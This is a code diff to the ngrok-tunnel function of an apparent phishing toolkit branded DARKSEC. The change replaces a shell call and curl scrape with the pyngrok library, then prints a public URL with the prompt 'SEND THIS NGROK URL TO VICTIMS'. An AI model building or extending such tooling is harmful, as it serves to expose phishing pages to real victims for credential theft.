@@ -60,16 +60,20 @@ def start_ngrok(port):
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
     #run_command(['./Server/ngrok http {0}'.format(port)], stdout=DEVNULL, stderr=DEVNULL)
-    chdir('Server')
-    run_command(['ngrok', 'http {0}'.format(port)],stdout=DEVNULL, stderr=DEVNULL)
-    chdir('..')
+    ##chmod('Server', 0o777)
+    ##run_command(['Server/ngrok', 'http {0}'.format(port)],stdout=DEVNULL, stderr=DEVNULL)
+    ngrok.connect(port)
+    #currentDirectory = os.getcwd() #DELETE
+    #print(currentDirectory) #DELETE
     while True:
         wait(2)
-        urlFile = open('link.url', 'w')
-        run_command(['curl', '-s', '-N', 'http://127.0.0.1:4040/api/tunnels', '|', 'grep', 'https://[0-9a-z]*\.ngrok.io', '-oh'], stdout=urlFile) #To Be Replaced
-        urlFile = open('link.url', 'r')
-        url = urlFile.read()
-        urlFile.close()
+        #urlFile = open('link.url', 'w')
+        #run_command(['curl', '-s', '-N', 'http://127.0.0.1:4040/api/tunnels', '|', 'grep', 'https://[0-9a-z]*\.ngrok.io', '-oh'], stdout=urlFile) #To Be Replaced
+        #urlFile = open('link.url', 'r')
+        #url = urlFile.read()
+        ngrok_tunnels = ngrok.get_tunnels()
+        url = ngrok_tunnels[0].public_url
+        #urlFile.close()
         if regular_expression.match("https://[0-9a-z]*\.ngrok.io", url) != None:
             print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
                 default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
